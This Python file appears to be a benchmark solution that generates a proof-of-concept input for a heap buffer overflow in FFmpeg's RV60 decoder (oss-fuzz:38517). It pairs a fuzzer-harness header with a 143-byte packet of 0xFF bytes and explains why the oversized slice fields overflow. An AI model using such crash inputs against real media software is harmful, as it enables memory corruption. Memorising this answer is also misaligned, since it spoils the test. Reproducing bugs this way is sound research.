import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Buffer Overflow in avcodec/rv60dec.
        
        The vulnerability (oss-fuzz:38517) is caused by the decoder trusting a slice size 
        field from the bitstream without checking if it fits within the packet buffer.
        By providing a stream of 0xFF bytes, we force the decoder to interpret size fields 
        as very large integers (maximum values), which triggers the out-of-bounds access 
        when the code initializes the slice bitstream reader.
        """
        
        # The FFmpeg fuzzer harness (target_dec_fuzzer) expects an input format of:
        # [4 bytes: Extradata Size (Little Endian)]
        # [N bytes: Extradata]
        # [M bytes: Packet Data]
        
        # 1. Extradata Size: 
        # RV60 requires at least 2 bytes of extradata to initialize.
        extradata_size = 2
        fuzzer_header = extradata_size.to_bytes(4, byteorder='little')
        
        # 2. Extradata: 
        # Provide minimal zeroed extradata to pass initialization without triggering 
        # "invalid dimension" or "too large" errors early on.
        extradata = b'\x00' * extradata_size
        
        # 3. Packet Data:
        # We fill the packet with 0xFF bytes.
        # This causes the bitstream reader to read all 1s, which are interpreted as 
        # large integer values for the slice headers/offsets.
        # The ground truth length is 149 bytes. 
        # 4 (header) + 2 (extradata) + 143 (packet) = 149 bytes.
        packet_data = b'\xff' * 143
        
        return fuzzer_header + extradata + packet_data